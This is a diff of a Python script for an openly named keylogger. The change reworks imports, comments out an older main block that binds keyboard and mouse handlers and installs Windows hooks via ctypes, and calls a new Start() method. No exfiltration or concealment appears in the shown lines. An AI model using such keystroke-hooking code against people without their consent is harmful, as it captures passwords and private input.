@@ -476,9 +476,44 @@ def MouseWheel( event ):
 
 import ctypes
 from ctypes import *
-from keylogger.listener import KeyLogger
+from keylogger.listener import HookManager
+from keylogger.keylogger import KeyLogger
 
 user32 = ctypes.windll.user32
+
+
+
+#if __name__=="__main__":
+
+#    keylogger = HookManager()
+
+#    keylogger.BindKeyDown( KeyDown )
+#    keylogger.BindKeyUp( KeyUp )
+
+#    keylogger.BindMouseLeftDown( MouseLeftDown )
+#    keylogger.BindMouseLeftUp( MouseLeftUp )
+
+#    keylogger.BindMouseRightDown( MouseRightDown )
+#    keylogger.BindMouseRightUp( MouseRightUp )
+
+#    keylogger.BindMouseMiddleDown( MouseMiddleDown )
+#    keylogger.BindMouseMiddleUp( MouseMiddleUp )
+
+#    keylogger.BindMouseWheel( MouseWheel )
+
+
+#    keylogger.HookKeyboard()
+#    keylogger.HookMouse()
+
+#    print( "Start keylogger..." )
+#    msg = ctypes.wintypes.MSG()
+#    user32.GetMessageW( byref(msg), 0, 0, 0 )
+
+#    print( "End keylogger..." )
+
+#    del keylogger
+
+
 
 
 
@@ -500,10 +535,14 @@ if __name__=="__main__":
 
     keylogger.BindMouseWheel( MouseWheel )
 
+    keylogger.Start()
 
+    #keylogger.Stop()
 
-    print( "Start keylogger..." )
-    msg = ctypes.wintypes.MSG()
-    user32.GetMessageW( byref(msg), 0, 0, 0 )
+    #print( "Start keylogger..." )
+    #msg = ctypes.wintypes.MSG()
+    #user32.GetMessageW( byref(msg), 0, 0, 0 )
 
-    print( "End keylogger..." )
+    #print( "End keylogger..." )
+
+    #del keylogger
